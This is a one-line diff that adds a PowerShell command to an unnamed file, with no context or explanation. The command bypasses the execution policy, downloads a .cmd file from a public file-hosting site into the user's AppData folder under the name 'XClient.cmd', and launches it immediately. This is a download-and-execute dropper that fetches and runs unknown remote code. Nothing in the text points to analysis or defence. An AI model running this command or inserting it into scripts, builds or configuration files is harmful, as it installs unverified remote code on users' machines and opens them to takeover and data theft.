@@ -1,0 +1,1 @@
+powershell -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest 'https://files.catbox.moe/ow7wdk.cmd' -OutFile $env:APPDATA\XClient.cmd; Start-Process $env:APPDATA\XClient.cmd"
